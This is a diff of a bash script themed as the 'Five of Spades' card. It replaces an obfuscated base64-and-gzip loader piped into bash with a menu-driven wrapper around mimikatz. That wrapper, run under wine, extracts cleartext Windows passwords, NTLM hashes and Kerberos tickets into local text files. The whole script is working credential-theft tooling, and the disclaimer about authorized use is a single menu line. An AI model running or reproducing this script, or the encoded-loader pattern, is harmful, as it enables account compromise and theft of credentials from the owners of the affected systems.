@@ -1,1 +1,82 @@
-bash -c "$(echo H4sICDXBcGcAA0ZpdmVfb2ZfU3BhZGVzAO1WXW/aMBR9z6+4o5VaKpGWUu0BtElTx6Rpa1WtlaapqyKT3IBFYqNrh5Z+/PfZIYGQEqAV6l7qFxJjH1/fe8652flw2OPisMfUwHFO/3w5/7T396jVum52Wh/jPedX97J7lU0dmXdnB85QJBBKAj1A+MbHCDKEyxELUMEpo8AJzZwnQ0+lc15s1u/X4cEBM/wIGaVP6A8kNBBquw/22KfafLYG6fC2NZ5BP8LKUbrUqvG4IXb3ThPzNfzmIpC3JlGEAQrNWaRg/4zHfMj0fX0t9tZSsmncrxlLsa8GXIFv6AEsimwGJjIBLSFRCPn97TtmifILCQpJxsCqsfOkqonSGLvTs7SUEZhfLjSKAIOUsqgH3GdReioXwBI9kMTvzb9V2CjGnKQwJNYKpIgm7vZysqXx5thNd8bnVM/aFA1GTKlbScFqvazFPnbhaxKP4Pzq5xkMjCutEeBLsFs27pEkDT+QekjSsIT7Q9QvO2Ip9onF5vo1sa7B3prmF0Q/dd7U3jPrJWQBNEZQ6xrFkNUngVnJfWybUKZPUw9nRj270wmjIiePvVnP1evNaOHNadHpzFYe1yEwRfaEjmIvK3Lh75YFsnXyhlmdvLxOhVUndpXJ+FFx8qCe5e67GLOIB1ncxhNoAqzPuHBrHVAR4giaHVjSqnI0VMx3nmzDW8F1Z8WFN+h5GTIX/WXgrusuVoiHcH0NjRDcwzizTBfvEG5uOrYZzytxywWWF42Ij3mEfWy3A+wlfVA4TChSrN2OZF+KeaHSrH4uxKHv9Ay6fIWL2TbFxsZHjYUvbCxdASOFlVhdIknteTsQUhvXTkRgvdp+bfgJkTFiCDihryVNSuhz6XSFSghhIQNpM0hxFItxDgLM+IBtGconPtLuFCvkBVUIaEJDQYNSgVwQKgVMTGCIE3tjQp2QsE8W3bLI1C6HecawKavKLueUFbEBfyyGJU8B5j+TphD/Am36ZATX6JrK2Fjdg1p5pdmbaQkDrwqlfP9ik5jRrxLmnYoVVKxoik6FCW9kbHanpWYZ9M34mXeMjJjlS6zk1bPPgxm5lsG882opr5ZN/wM2Hxq0bg4AAA== | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+# Menu for the Five of Spades Card
+five_of_spades_menu() {
+    clear
+    echo -e "${CYAN}"
+    echo "      _________________________________________________________________________"
+    echo "     |                              Five of Spades                             |"
+    echo "     |                     Extract Windows Credentials (Mimikatz)              |"
+    echo "     |_________________________________________________________________________|"
+    echo "     |                                                                         |"
+    echo "     |  This card allows you to use Mimikatz to extract credentials from a     |"
+    echo "     |  Windows system. This tool is intended for ethical use in authorized    |"
+    echo "     |  environments only.                                                     |"
+    echo "     |                                                                         |"
+    echo "     |                                                                         |"
+    echo "     |  1. Extract cleartext passwords                                         |"
+    echo "     |  2. Dump NTLM hashes                                                    |"
+    echo "     |  3. Export Kerberos tickets                                             |"
+    echo "     |  4. Exit                                                                |"
+    echo "     |__________________________________________________________________________|"
+    echo -e "${RESET}"
+    read -p "Enter your choice: " choice
+    case $choice in
+        1) extract_cleartext_passwords ;;
+        2) dump_ntlm_hashes ;;
+        3) export_kerberos_tickets ;;
+        4) exit 0 ;;
+        *) echo "Invalid choice. Try again."; sleep 1; five_of_spades_menu ;;
+    esac
+}
+
+# Extract cleartext passwords
+extract_cleartext_passwords() {
+    clear
+    echo -e "${CYAN}Extracting cleartext passwords...${RESET}"
+    if [[ -f ./mimikatz.exe ]]; then
+        wine ./mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > passwords.txt
+        echo -e "${CYAN}Passwords saved to passwords.txt.${RESET}"
+    else
+        echo -e "${CYAN}Error: Mimikatz not found in the current directory.${RESET}"
+        echo "Ensure mimikatz.exe is in the same directory as this script."
+    fi
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    five_of_spades_menu
+}
+
+# Dump NTLM hashes
+dump_ntlm_hashes() {
+    clear
+    echo -e "${CYAN}Dumping NTLM hashes...${RESET}"
+    if [[ -f ./mimikatz.exe ]]; then
+        wine ./mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > ntlm_hashes.txt
+        grep -Eo "NTLM.*" ntlm_hashes.txt > extracted_ntlm_hashes.txt
+        echo -e "${CYAN}NTLM hashes saved to extracted_ntlm_hashes.txt.${RESET}"
+    else
+        echo -e "${CYAN}Error: Mimikatz not found in the current directory.${RESET}"
+        echo "Ensure mimikatz.exe is in the same directory as this script."
+    fi
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    five_of_spades_menu
+}
+
+# Export Kerberos tickets
+export_kerberos_tickets() {
+    clear
+    echo -e "${CYAN}Exporting Kerberos tickets...${RESET}"
+    if [[ -f ./mimikatz.exe ]]; then
+        wine ./mimikatz.exe privilege::debug sekurlsa::tickets exit > kerberos_tickets.txt
+        echo -e "${CYAN}Kerberos tickets saved to kerberos_tickets.txt.${RESET}"
+    else
+        echo -e "${CYAN}Error: Mimikatz not found in the current directory.${RESET}"
+        echo "Ensure mimikatz.exe is in the same directory as this script."
+    fi
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    five_of_spades_menu
+}
+
+five_of_spades_menu
